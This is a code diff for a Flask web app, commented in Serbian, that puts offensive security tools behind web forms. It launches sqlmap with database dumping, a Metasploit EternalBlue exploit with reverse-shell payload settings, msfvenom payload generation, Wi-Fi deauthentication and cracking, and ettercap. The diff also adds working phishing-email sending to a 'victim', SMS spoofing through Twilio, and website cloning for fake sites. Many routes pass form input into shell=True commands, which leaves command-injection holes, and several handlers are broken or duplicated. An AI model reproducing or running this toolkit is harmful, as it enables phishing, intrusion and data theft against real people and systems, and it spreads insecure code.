@@ -1,6 +1,11 @@
 import subprocess
-from flask import Flask, render_template, request, jsonify, redirect, url_for
+from flask import Flask, render_template, request, jsonify, redirect, url_for, Blueprint
 import time 
+import smtplib
+import os
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from twilio.rest import Client
 
 app = Flask(__name__)
 
@@ -21,6 +26,184 @@ def password_cracking():
 @app.route('/network_scanners')
 def network_scanners():
     return render_template('network_scanners.html')
+
+@app.route('/nikto')
+def nikto():
+    return render_template('/nikto.html')  # Stranica za Nikto alat
+@app.route('/nikto', methods=['GET', 'POST'])
+def nikto_tool():
+    result = None
+
+    if request.method == 'POST':
+        # Preuzimanje parametara iz forme
+        target = request.form.get('target')  # URL ili IP meta
+        port = request.form.get('port')  # Port za skeniranje
+        ssl = request.form.get('ssl')  # SSL skeniranje
+        output = request.form.get('output')  # Izveštaj
+
+        # Građenje komandne linije
+        if target:
+            command = f"nikto -h {target}"
+            if port:
+                command += f" -p {port}"
+            if ssl:
+                command += " -ssl"
+            if output:
+                command += f" -o {output}"
+
+            try:
+                # Pokretanje Nikto alata
+                process = subprocess.run(command.split(), capture_output=True, text=True)
+                result = process.stdout if process.returncode == 0 else process.stderr
+            except Exception as e:
+                result = f"Error: {str(e)}"
+        else:
+            result = "Please provide a valid target."
+
+    return render_template('nikto.html', result=result)
+
+
+@app.route('/sqlmap')
+def sqlmap():
+    return render_template('/sqlmap.html')  # Stranica za SQLMap alat
+@app.route('/sqlmap', methods=['GET', 'POST'])
+def sqlmap_tool():
+    result = None
+
+    if request.method == 'POST':
+        # Preuzimanje parametara iz forme
+        target_url = request.form.get('target_url')
+        method = request.form.get('method')
+        db_info = request.form.get('db_info')
+        dump_data = request.form.get('dump_data')
+
+        # Provera unetih opcija
+        if not target_url:
+            return render_template('sqlmap.html', result="Target URL is required.")
+
+        # Građenje komandne linije
+        command = f"sqlmap -u {target_url}"
+        if method:
+            command += f" --method={method}"
+        if db_info == 'yes':
+            command += " --dbs"
+        if dump_data == 'yes':
+            command += " --dump"
+
+        try:
+            # Pokretanje SQLMap alata
+            process = subprocess.run(command.split(), capture_output=True, text=True)
+            result = process.stdout if process.returncode == 0 else process.stderr
+        except Exception as e:
+            result = f"Error: {str(e)}"
+
+    return render_template('sqlmap.html', result=result)
+
+
+@app.route('/wfuzz')
+def wfuzz():
+    return render_template('/wfuzz.html')  # Stranica za WFuzz alat
+
+@app.route('/wfuzz', methods=['GET', 'POST'])
+def wfuzz_tool():
+    result = None
+
+    if request.method == 'POST':
+        # Preuzimanje parametara iz forme
+        target_url = request.form.get('target_url')
+        wordlist = request.form.get('wordlist')
+        test_headers = request.form.get('test_headers', 'no')
+        test_cookies = request.form.get('test_cookies', 'no')
+
+        if not target_url or not wordlist:
+            return render_template('wfuzz.html', result="Target URL and Wordlist are required.")
+
+        # Građenje osnovne komande
+        command = f"wfuzz -c -z file,{wordlist} -u {target_url}"
+
+        # Opcionalne funkcionalnosti
+        if test_headers == 'yes':
+            command += " -H 'FUZZ: CustomHeader'"
+        if test_cookies == 'yes':
+            command += " -b 'session=FUZZ'"
+
+        try:
+            # Pokretanje WFuzz alata
+            process = subprocess.run(command.split(), capture_output=True, text=True)
+            result = process.stdout if process.returncode == 0 else process.stderr
+        except Exception as e:
+            result = f"Error: {str(e)}"
+
+    return render_template('wfuzz.html', result=result)
+
+
+@app.route('/whatweb')
+def whatweb():
+    return render_template('/whatweb.html')  # Stranica za WhatWeb alat
+def whatweb_tool():
+    result = None
+
+    if request.method == 'POST':
+        # Preuzimanje parametara iz forme
+        target_url = request.form.get('target_url')
+        detailed_scan = request.form.get('detailed_scan', 'no')
+        show_headers = request.form.get('show_headers', 'no')
+
+        if not target_url:
+            return render_template('whatweb.html', result="Target URL is required.")
+
+        # Građenje osnovne komande
+        command = f"whatweb {target_url}"
+
+        # Dodavanje opcija
+        if detailed_scan == 'yes':
+            command += " --verbose"
+        if show_headers == 'yes':
+            command += " --log-headers"
+
+        try:
+            # Pokretanje WhatWeb alata
+            process = subprocess.run(command.split(), capture_output=True, text=True)
+            result = process.stdout if process.returncode == 0 else process.stderr
+        except Exception as e:
+            result = f"Error: {str(e)}"
+
+    return render_template('whatweb.html', result=result)
+
+
+@app.route('/wafwoof')
+def wafwoof():
+    return render_template('/wafwoof.html')  # Stranica za WafW00f alat
+def wafwoof_tool():
+    result = None
+
+    if request.method == 'POST':
+        # Preuzimanje parametara iz forme
+        target_url = request.form.get('target_url')
+        detailed_scan = request.form.get('detailed_scan', 'no')
+        list_wafs = request.form.get('list_wafs', 'no')
+
+        if not target_url and list_wafs != 'yes':
+            return render_template('wafwoof.html', result="Target URL is required unless listing WAFs.")
+
+        # Građenje osnovne komande
+        if list_wafs == 'yes':
+            command = "wafw00f --list"
+        else:
+            command = f"wafw00f {target_url}"
+            if detailed_scan == 'yes':
+                command += " -v"
+
+        try:
+            # Pokretanje WafW00f alata
+            process = subprocess.run(command.split(), capture_output=True, text=True)
+            result = process.stdout if process.returncode == 0 else process.stderr
+        except Exception as e:
+            result = f"Error: {str(e)}"
+
+    return render_template('wafwoof.html', result=result)
+
+
 
 @app.route('/sniffing_tools')
 def sniffing_tools():
@@ -124,31 +307,45 @@ def whois_results():
     result = f"Whois data for {target} using {tool} tool."
 
     return jsonify({'result': result})
-@app.route('/dns_enum', methods=['GET', 'POST'])
+@app.route('/dns_enum')
+def dns_enum():
+    return render_template('dns_enum.html')
 def dns_enum():
     if request.method == 'POST':
-        if request.is_json:
-            scan_data = request.get_json()  # Ako su podaci u JSON formatu
-            target = scan_data['target']
-            tool = scan_data['tool']
-        else:
-            target = request.form.get('target')  # Ako su podaci iz HTML forme
-            tool = request.form.get('tool')
+        try:
+            # Proverava da li je zahtev JSON ili iz forme
+            if request.is_json:
+                scan_data = request.get_json()
+                target = scan_data.get('target')
+                tool = scan_data.get('tool')
+            else:
+                target = request.form.get('target')
+                tool = request.form.get('tool')
 
-        result = ""
-        
-        # Pokretanje odgovarajuće komande na osnovu izabranog alata
-        if tool == 'dnsrecon':
-            result = subprocess.run(['dnsrecon', '-d', target], capture_output=True, text=True).stdout
-        elif tool == 'sublister':
-            result = subprocess.run(['sublister', '-d', target], capture_output=True, text=True).stdout
-        elif tool == 'amass':
-            result = subprocess.run(['amass', 'enum', '-d', target], capture_output=True, text=True).stdout
-        elif tool == 'dnssdumpster':
-            result = subprocess.run(['curl', '-s', f'https://dnsdumpster.com/static/map/resolve.php?host={target}'], capture_output=True, text=True).stdout
-        
-        return jsonify({'result': result})  # Vraća rezultat u JSON formatu
+            if not target or not tool:
+                return jsonify({'error': 'Target or tool not specified.'}), 400
 
+            # Mapiranje alata na odgovarajuće komande
+            commands = {
+                'dnsrecon': ['dnsrecon', '-d', target],
+                'sublister': ['sublister', '-d', target],
+                'amass': ['amass', 'enum', '-d', target],
+                'dnssdumpster': ['curl', '-s', f'https://dnsdumpster.com/static/map/resolve.php?host={target}']
+            }
+
+            if tool not in commands:
+                return jsonify({'error': 'Invalid tool selected.'}), 400
+
+            # Pokretanje odgovarajuće komande
+            command = commands[tool]
+            result = subprocess.run(command, capture_output=True, text=True)
+            output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
+
+            return jsonify({'result': output})
+        except Exception as e:
+            return jsonify({'error': str(e)}), 500
+
+    # GET metoda prikazuje HTML stranicu
     return render_template('dns_enum.html')
 
 # Stranica za prikaz rezultata DNS alata
@@ -168,60 +365,252 @@ def dns_results():
     result = f"DNS data for {target} using {tool} tool."
 
     return jsonify({'result': result})
-@app.route('/exploitation_tools', methods=['GET', 'POST'])
+@app.route('/exploitation_tools', methods=['GET'])
 def exploitation_tools():
-    if request.method == 'POST':
-        tool = request.form.get('tool')
-        arguments = request.form.get('arguments', '')
-
-        # Mapa dostupnih alata i komandi
-        tools = {
-            "metasploit": "msfconsole -q",
-            "msfvenom": f"msfvenom {arguments}",
-            "searchsploit": f"searchsploit {arguments}",
-            "exploitdb": f"exploitdb {arguments}",
-        }
-
-        if tool not in tools:
-            return render_template('exploitation_tools.html', result="Invalid tool selected!")
-
-        command = tools[tool]
-
-        try:
-            print(f"Running command: {command}")  # Debug log
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
-        except subprocess.CalledProcessError as e:
-            result = f"Error executing command: {e.output}"
-
-        return render_template('exploitation_tools.html', result=result)
-
     return render_template('exploitation_tools.html')
-@app.route('/wifi_tools', methods=['GET', 'POST'])
+@app.route('/metasploit', methods=['GET'])
+def metasploit():
+    return render_template('metasploit.html')
+def metasploit():
+    if request.method == 'POST':
+        data = request.get_json()  # Uzimamo podatke u JSON formatu
+        target = data.get('target')
+        payload = data.get('payload')
+        lhost = data.get('lhost')
+        lport = data.get('lport')
+        rport = data.get('rport')
+
+        result = run_metasploit(target, payload, lhost, lport, rport)
+        return jsonify({'result': result})
+
+    return render_template('metasploit.html')
+
+def run_metasploit(target, payload, lhost, lport, rport):
+    try:
+        # Pokretanje Metasploit komande sa više parametara
+        command = f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target}; set LHOST {lhost}; set LPORT {lport}; set RPORT {rport}; set PAYLOAD {payload}; run'"
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        return result.stdout
+    except Exception as e:
+        return str(e)
+    
+@app.route('/msfvenom', methods=['GET'])
+def msfvenom():
+    return render_template('msfvenom.html')
+def msfvenom():
+    if request.method == 'POST':
+        data = request.get_json()  # Uzimamo podatke u JSON formatu
+        lhost = data.get('lhost')
+        lport = data.get('lport')
+        payload = data.get('payload')
+        format = data.get('format')
+
+        result = run_msfvenom(lhost, lport, payload, format)
+        return jsonify({'result': result})
+
+    return render_template('msfvenom.html')
+
+def run_msfvenom(lhost, lport, payload, format):
+    try:
+        # Pokretanje MSFvenom komande za generisanje payload-a
+        command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} > /tmp/payload.{format}"
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        return result.stdout
+    except Exception as e:
+        return str(e)
+    
+@app.route('/searchsploit', methods=['GET'])
+def show_searchsploit():
+    return render_template('searchsploit.html')
+
+# Ruta za POST zahtev koji izvršava searchsploit komandu
+@app.route('/searchsploit', methods=['POST'])
+def searchsploit():
+    if request.method == 'POST':
+        try:
+            # Preuzimanje target-a iz JSON zahteva
+            data = request.get_json()
+            target = data.get('target')
+
+            if not target:
+                return jsonify({"error": "Target not provided"}), 400
+
+            # Pokretanje SearchSploit za pretragu exploita
+            command = f"searchsploit {target}"
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+            if result.returncode != 0:
+                return jsonify({"error": "Error while running SearchSploit"}), 500
+
+            # Vraćanje rezultata kao JSON
+            return jsonify({"result": result.stdout})
+
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+        
+# Ruta za prikazivanje exploitdb stranice
+@app.route('/exploitdb', methods=['GET'])
+def exploitdb_search():
+    return render_template('exploitdb.html')
+
+# Ruta za POST zahtev koji izvršava exploitdb pretragu
+@app.route('/exploitdb', methods=['POST'])
+def exploitdb():
+    if request.method == 'POST':
+        try:
+            # Preuzimanje target-a iz JSON zahteva
+            data = request.get_json()
+            target = data.get('target')
+
+            if not target:
+                return jsonify({"error": "Target not provided"}), 400
+
+            # Pokretanje ExploitDB pretrage
+            command = f"search {target}"
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+            if result.returncode != 0:
+                return jsonify({"error": "Error while running ExploitDB search"}), 500
+
+            # Vraćanje rezultata kao JSON
+            return jsonify({"result": result.stdout})
+
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+
+@app.route('/wifi_tools', methods=['GET'])
 def wifi_tools():
+    return render_template('wifi_tools.html')
+
+@app.route('/aircrackg',methods=['GET'])
+def aircrack_ng():
+    return render_template('aircrack.html')                          
+                        
+def aircrack():
     result = None
     if request.method == 'POST':
-        tool = request.form.get('tool')
-        arguments = request.form.get('arguments')
-        
-        # Map the tool to a corresponding command
+        # Preuzimanje akcije koju korisnik želi
+        action = request.form.get('action')
+        arguments = request.form.get('arguments', "")
+
+        # Mapiranje akcija na odgovarajuće komande
         commands = {
-            'aircrack-ng': f"aircrack-ng {arguments}",
-            'kismet': f"kismet {arguments}",
-            'wifite': f"wifite {arguments}",
-            'wash': f"wash {arguments}"
+            'crack_handshake': f"aircrack-ng {arguments}",
+            'capture_traffic': f"airodump-ng {arguments}",
+            'deauth_attack': f"aireplay-ng {arguments}",
+            'show_help': "aircrack-ng --help"
         }
-        
-        command = commands.get(tool, None)
-        if command:
+
+        # Provera validne akcije
+        command = commands.get(action)
+        if not command:
+            result = "Invalid action selected."
+        else:
             try:
-                # Run the tool and capture the output
+                # Pokretanje komande i hvatanje izlaza
                 result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
             except subprocess.CalledProcessError as e:
                 result = f"Error: {e.output}"
-        else:
-            result = "Invalid tool selected."
+            except Exception as e:
+                result = f"Unexpected Error: {str(e)}"
 
-    return render_template('wifi_tools.html', result=result)
+    return render_template('aircrack.html', result=result)
+
+@app.route('/kismet',methods=['GET'])
+def kismet():
+    return render_template('kismet.html')
+def kismet():
+    result = None
+    if request.method == 'POST':
+        # Preuzimanje akcije od korisnika
+        action = request.form.get('action')
+
+        # Mapiranje akcija na odgovarajuće komande
+        commands = {
+            'start_server': "kismet",
+            'list_devices': "kismet_cap_linux_wifi --list",
+            'export_logs': "cp /var/log/kismet/* ./kismet_logs/"  # Primer za izvoz logova
+        }
+
+        # Preuzimanje komande na osnovu akcije
+        command = commands.get(action)
+        if not command:
+            result = "Invalid action selected."
+        else:
+            try:
+                # Pokretanje komande i hvatanje izlaza
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+            except subprocess.CalledProcessError as e:
+                result = f"Error: {e.output}"
+            except Exception as e:
+                result = f"Unexpected Error: {str(e)}"
+
+    return render_template('kismet.html', result=result)
+@app.route('/wifite',methods=['GET'])
+def wifite():
+    return render_template('wifite.html')
+
+def wifite():
+    result = None
+    if request.method == 'POST':
+        # Preuzimanje akcije od korisnika
+        action = request.form.get('action')
+
+        # Mapiranje akcija na odgovarajuće komande
+        commands = {
+            'scan_networks': "wifite --scan",
+            'attack_all': "wifite --all",
+            'show_help': "wifite --help"
+        }
+
+        # Provera da li je validna akcija
+        command = commands.get(action)
+        if not command:
+            result = "Invalid action selected."
+        else:
+            try:
+                # Pokretanje komande i hvatanje izlaza
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+            except subprocess.CalledProcessError as e:
+                result = f"Error: {e.output}"
+            except Exception as e:
+                result = f"Unexpected Error: {str(e)}"
+
+    return render_template('wifite.html', result=result)
+
+@app.route('/wash',methods=['GET'])
+def wash():
+    return render_template('wash.html')
+
+def wash():
+    result = None
+    if request.method == 'POST':
+        # Preuzimanje akcije od korisnika
+        action = request.form.get('action')
+
+        # Mapiranje akcija na odgovarajuće komande
+        commands = {
+            'scan_wps': "wash -i wlan0mon",  # Proverite da li koristite ispravnu interfejs karticu
+            'show_help': "wash --help"
+        }
+
+        # Provera da li je validna akcija
+        command = commands.get(action)
+        if not command:
+            result = "Invalid action selected."
+        else:
+            try:
+                # Pokretanje komande i hvatanje izlaza
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+            except subprocess.CalledProcessError as e:
+                result = f"Error: {e.output}"
+            except Exception as e:
+                result = f"Unexpected Error: {str(e)}"
+
+    return render_template('wash.html', result=result)
+
+
+
 @app.route('/hydra')
 def hydra():
     return render_template('hydra.html')
@@ -361,18 +750,20 @@ def sniffing_home():
 def run_tool():
     data = request.get_json()
     tool = data.get('tool')
+    arguments = data.get('arguments', "")  # Korisnik može da prosledi dodatne argumente
 
-    if tool not in ['tcpdump', 'wireshark', 'ettercap']:
+    # Mapa dostupnih alata i osnovnih komandi
+    command_map = {
+        "tcpdump": f"tcpdump {arguments}",
+        "wireshark": "tshark -r file.pcap",  # Wiresharkova CLI verzija (tshark)
+        "ettercap": f"ettercap {arguments}"
+    }
+
+    if tool not in command_map:
         return jsonify({"error": "Invalid tool selected"}), 400
 
-    # Simulating command execution (replace this with actual commands)
-    command_map = {
-        "tcpdump": "tcpdump -c 10 -i any",  # Example TCPDump command
-        "wireshark": "echo 'Wireshark GUI cannot run here'",  # Wireshark simulation
-        "ettercap": "ettercap --help"  # Example Ettercap command
-    }
-    
     try:
+        # Pokreni komandu za alat
         result = subprocess.run(command_map[tool], shell=True, text=True, capture_output=True)
         output = result.stdout or result.stderr
     except Exception as e:
@@ -499,37 +890,117 @@ def run_others_attack():
         return jsonify({"success": False, "error": f"Greška: {str(e)}"}), 500
 
 
-@app.route('/social_engineering')
-def social_engineering_page():
-    return render_template('social_engineering.html')
+@app.route('/social-engineering-tool')
+def social_engineering_tool():
+    return render_template('social_engineering_tool.html')
 
-@app.route('/run_social_tool', methods=['POST'])
-def run_social_tool():
-    data = request.get_json()
-    tool = data.get('tool')
-    target = data.get('target')
+# Ruta za Phishing Email
+@app.route('/phishing')
+def phishing_tool():
+    return render_template('phishing.html')
+@app.route('/phishing', methods=['GET', 'POST'])
+def phishing():
+    if request.method == 'POST':
+        victim_email = request.form.get('victim_email')
+        subject = request.form.get('subject')
+        content = request.form.get('content')
 
-    if not tool or not target:
-        return jsonify({"error": "Morate odabrati alat i uneti ciljnu adresu."}), 400
+        if victim_email and subject and content:
+            try:
+                # Pozivamo funkciju koja šalje phishing email sa novim poljima
+                send_phishing_email(victim_email, subject, content)
+                return render_template('phishing.html', message="Phishing email has been sent successfully!")
+            except Exception as e:
+                return render_template('phishing.html', message=f"Error: {str(e)}")
+        else:
+            return render_template('phishing.html', message="Please provide all required fields!")
+    return render_template('phishing.html')
 
-    # Mapiranje alata na komande
-    command_map = {
-        "phishing_email": f"echo 'Simulating phishing email to {target}'",
-        "fake_website": f"echo 'Creating fake website for {target}'",
-        "sms_spoofing": f"echo 'Simulating SMS spoofing to {target}'"
-    }
-
-    command = command_map.get(tool)
-    if not command:
-        return jsonify({"error": "Izabrani alat nije podržan."}), 400
+def send_phishing_email(victim_email, subject, content):
+    sender_email = "your_email@example.com"  # Tvoj email
+    sender_password = "your_password"  # Tvoja lozinka
+    smtp_server = "smtp.example.com"  # SMTP server
+    smtp_port = 587  # Port za SMTP (npr. 587 za TLS)
 
     try:
-        result = subprocess.run(command, shell=True, text=True, capture_output=True)
-        output = result.stdout or result.stderr
-    except Exception as e:
-        output = f"Greška prilikom pokretanja alata: {str(e)}"
+        # Postavljanje phishing emaila sa svim podacima
+        msg = MIMEMultipart()
+        msg['From'] = sender_email
+        msg['To'] = victim_email
+        msg['Subject'] = subject
+        msg.attach(MIMEText(content, 'plain'))
 
-    return jsonify({"output": output})
+        # Povezivanje sa SMTP serverom
+        server = smtplib.SMTP(smtp_server, smtp_port)
+        server.starttls()
+        server.login(sender_email, sender_password)
+
+        # Slanje emaila
+        server.sendmail(sender_email, victim_email, msg.as_string())
+        server.quit()
+    except Exception as e:
+        raise Exception(f"Failed to send email: {str(e)}")
+# Ruta za SMS Spoofing
+@app.route('/smishing')
+def smishing_def():
+    return render_template('smishing.html')
+@app.route('/smishing', methods=['GET', 'POST'])
+def smishing():
+    if request.method == 'POST':
+        target_phone = request.form.get('target_phone')
+        message = request.form.get('message')
+
+        if target_phone and message:
+            try:
+                # Pozivamo funkciju koja simulira slanje SMS spoofa
+                send_sms_spoof(target_phone, message)
+                return render_template('smishing.html', message="SMS Spoof has been sent successfully!")
+            except Exception as e:
+                return render_template('smishing.html', message=f"Error: {str(e)}")
+        else:
+            return render_template('smishing.html', message="Please provide all required fields!")
+    return render_template('smishing.html')
+
+def send_sms_spoof(target_phone, message):
+    # Kreiraj Twilio klijent
+    client = Client(account_sid, auth_token)
+
+    # Slanje SMS poruke sa spoofovanim brojem
+    client.messages.create(
+        body=message,  # Sadržaj poruke
+        from_=twilio_number,  # Twilio broj
+        to=target_phone  # Broj cilja
+    )
+
+# Ruta za Lažni Web Sajt
+@app.route('/fake-website')
+def fake_website_def():
+    return render_template('fake_website.html')
+@app.route('/fake-website', methods=['GET', 'POST'])
+def fake_website():
+    if request.method == 'POST':
+        target_url = request.form.get('target_url')
+
+        if target_url:
+            try:
+                # Generišemo lažni sajt pomoću HTTrack
+                clone_website(target_url)
+                return render_template('fake_website.html', message="Fake website has been generated successfully! Check the cloned site directory.")
+            except Exception as e:
+                return render_template('fake_website.html', message=f"Error: {str(e)}")
+        else:
+            return render_template('fake_website.html', message="Please provide a valid URL!")
+    return render_template('fake_website.html')
+
+def clone_website(target_url):
+    # Definišemo direktorijum za skladištenje kloniranog sajta
+    output_dir = f"cloned_sites/{target_url.replace('https://', '').replace('http://', '')}"
+    if not os.path.exists(output_dir):
+        os.makedirs(output_dir)
+
+    # Pokrećemo HTTrack da kloniramo veb sajt
+    command = f"httrack {target_url} -O {output_dir}"
+    subprocess.run(command, shell=True)
 
 if __name__ == '__main__':
     app.run(debug=True)
